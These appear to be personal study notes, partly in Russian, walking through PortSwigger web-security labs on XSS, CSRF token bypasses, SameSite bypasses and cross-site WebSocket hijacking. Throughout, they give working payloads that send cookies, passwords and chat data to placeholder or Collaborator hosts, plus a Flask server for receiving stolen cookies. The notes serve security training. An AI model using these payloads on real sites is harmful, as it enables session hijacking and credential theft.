# Exploiting cross-site scripting to steal cookies

[PayloadsAllTheThings - XSS - data-grabber-for-xs](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss)
Пример в CORS: 
```javascript
<script>
  fetch('https://{site.com}', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```
или
```html
<img src=x onerror=this.src="http://<my_server>:<port>/"+btoa(document.cookie)>
```
#### Exploiting cross-site scripting to capture passwords
Здесь представлена форма, которая ожидает ввода логина и пароля, и сказу отправляет из в коллаборатор.
```javascript
<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method:'POST', mode:'no-cors', body:username.value+':'+this.value });">
```
### Python web-server to take cookie:
```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['POST'])
def handle_post():
	message = request.data.decode('utf-8')
	print("Received message:", message)
	return 'Message recieved'
if __name__ == '__main__':
	app.run(port=8080)
```
#### Atack payload
```javascript
<iframe src="javascript:fetch('http://localhost:8080', { method: 'POST', body: 'message=Hello', headers: { 'Content-Type': 'text/plain' }}); ">
```
```javascript
<iframe src="javascript:fetch('http://localhost:8080', { method: 'POST', body: document.cookie, headers: { 'Content-Type': 'text/plain' }}); ">
```
# CSRF без всякой защиты (use exploit server)
https://portswigger.net/web-security/csrf/lab-no-defenses
Repeater -> Engagement tools -> Generate CSRF PoC 
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0afc009604f04a3c817484ab003500e8.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="zxc&#64;zxc&#46zxc" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```
# CSRF уязвимости токена

## Exploiting XSS to perform CSRF
**Пользователь**, зашедший на страницу с **xss**, направит запрос и свой **csrf токен** на смену **email** на **'/my-account/change-email'**, если **токен** висит в **html**.
```javascript
<script>  
var req = new XMLHttpRequest();  
req.onload = handleResponse;  
req.open('get','/my-account',true);  
req.send();  
function handleResponse() {  
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];  
var changeReq = new XMLHttpRequest();  
changeReq.open('post', '/my-account/change-email', true);  
changeReq.send('csrf='+token+'&email=test@test.com')  
};  
</script>
```
## CSRF, когда проверка токена зависит от метода запроса (use exploit server)
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method
1. Repeater -> Change request method
2. Repeater -> Engagement tools -> Generate CSRF PoC
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a89008e03d199f389c89f8100bb0096.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="zxc&#64;zxc&#46;zxc" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
## CSRF, когда проверка токена зависит от его наличия (use exploit server)
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present
just delete csrf token.
1. Repeater -> Change request method
2. Repeater -> Engagement tools -> Generate CSRF PoC
## CSRF, когда токен не привязан к сессии пользователя (use exploit server)
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session
Использовать свой токен в эксплойте на сервере
1. Proxy -> Intercept -> Intercept is off (to on) -> go to repeter
2. Repeater -> Engagement tools -> Generate CSRF PoC
## CSRF, когда токен привязан к не сеансовому cookie или дублирует не сеансовый cookie
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie
Нужно в форме подвязать свои не сеансовые cookie. Это возможно, если найти пользовательский input, который недостаточно валидирован и передаёт своё значение в header ответа. 

Пусть существует возможность сделать поисковый запрос на сайте:
```http
GET /?search=qwe HTTP/2
Host: 0a5000e0034cd7ff82dc2511007f007e.web-security-academy.net
Cookie: csrfKey=LAKDqGn6ShUWMc54eSO2ZV176pPOh7Fi; session=fZSQ6mf9BoFyRGfEoI4q9WAYTTjG8Kaw
...
```
И получить ответ:
```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=qwe; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3419

<!DOCTYPE html>
<html>
...
```
Тогда можно переписать запрос, вставив в него нужный нам `Set-Cookie`:
```http
GET /?search=q%0D%0ASet-Cookie:%20csrfKey=LAKDqGn6ShUWMc54eSO2ZV176pPOh7Fi%20Same-Site=None HTTP/2
Host: 0a5000e0034cd7ff82dc2511007f007e.web-security-academy.net
Cookie: csrfKey=LAKDqGn6ShUWMc54eSO2ZV176pPOh7Fi; session=fZSQ6mf9BoFyRGfEoI4q9WAYTTjG8Kaw
...
```
Тогда пэйлоадом будет выступать:
1. Repeater -> Engagement tools -> Generate CSRF PoC = $FORM
```html
$FORM
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()" />
```
# SameSite cookie
>**SameSite** - механизм безопасности браузера, который определяет, когда cookie веб-сайта включаются в запросы, исходящие от других веб-сайтов. Ограничения cookie SameSite обеспечивают частичную защиту от различных межсайтовых атак, включая CSRF, межсайтовые утечки и некоторые эксплойти CORS.
![[SameSite and Origin.png]]

|   |   |   |   |
|---|---|---|---|
|**Request from**|**Request to**|**Same-site?**|**Same-origin?**|
|`https://example.com`|`https://example.com`|Yes|Yes|
|`https://app.example.com`|`https://intranet.example.com`|Yes|No: mismatched domain name|
|`https://example.com`|`https://example.com:8080`|Yes|No: mismatched port|
|`https://example.com`|`https://example.co.uk`|No: mismatched eTLD|No: mismatched domain name|
|`https://example.com`|`http://example.com`|No: mismatched scheme|No: mismatched scheme|
![[SameSite ограничения.png]]
![[SameSite strict.png]]
## Обход SameSite Lax через переопределение метода (use exploit server)
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override
Может быть полезным Burp расширение: `Param Miner`.

Сначала пробуем переопределить метод запроса с POST на GET:
1. Repeater->Change request method
2. Пробуем параметр **`&_method=POST`**: GET /my-account/change-email?email=q%40q.q**`&_method=POST`** HTTP/2
Эксплойт:
```javascript
<script>
document.location="https://{site.com}/change-email?email=q%40q.q&_method=POST"
</script>
```
## Обход SameSite Lax через обновление cookie (use exploit server)
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh
Cookies с ограничениями Lax SameSite обычно не отправляются в межсайтовых POST-запросах, но есть и исключения.  
  
Если веб-сайт не включает атрибут SameSite при установке cookie, Chrome автоматически применяет ограничения Lax по умолчанию. Однако, чтобы не нарушать механизмы единой авторизации (SSO), он не применяет эти ограничения в течение первых 120 секунд для POST-запросов верхнего уровня. В результате в течение двух минут пользователи могут быть подвержены межсайтовым атакам.

В лабораторной работе настроен механизм авторизации через сторонний сервис. Значит если мы обновим ограничение первых 120 секунд, вызываемое при авторизации через сторонний сервис, то сможем воспользоваться  cookie.

1. Repeater -> Engagement tools -> Generate CSRF PoC = $FORM
```javascript
$FORM
<script>
	window.open('https://{site.com}/social-login');
	setTimeout(changeEmail, 5000);

	const changeEmail = () => document.forms[0].submit();
	/* или
	function changeEmail() {
		document.forms[0].submit();
	}
	*/
</script>
```

## SameSite Strict - перенаправление на стороне клиента (use exploit server)
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect
Допустим на сайте есть скрипт:
```javascript
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```
В таком случае можно использовать open redirect - маршрут по изменению email в параметре postId:
```http
GET /site.com/?postId=../../../{маршрут на смену email}
```
Далее просто проэксплуатирвоать нагрузку:
```javascript
<script>
	document.lacation = 'https://site.com/?postId=../../../{маршрут на смену email}'
</script>
```
По сути нужно лишь проэксплуатировать open redirect, если он есть на сайте.

## SameSite Strict через дочерний домен ([cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) ([CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)))
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
Допустим есть сервер с живым чатом, использующий веб-сокеты для загрузки контента даже неавторизованного пользователя. Можно открыть CSRF соединение искусственно на своём explit сервере:

``` javascript
<script>
var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; 
ws.onmessage = function(event) { 
	fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); }; 
</script>
```
В итоге в тело запроса колобаратора попадёт подтверждение наличия уязвимости CSWSH.
С помощью Target -> Site map можно изучить веб-ресурс и поискать сторонние домены, например в js скриптах или html. В данной лабораторной оказывается уязвимый поддомен с XSS. 

На уязвимом сайте делаем XSS в GET запросе с закодированным в URL скриптом выше.
```http
https://cms-0ae4007f048e205982bcbfed00bc0073.web-security-academy.net/login?username=%3Cscript%3E{here code upper}%3C/script%3E&password=q
```

# Валидация заголовка Refere


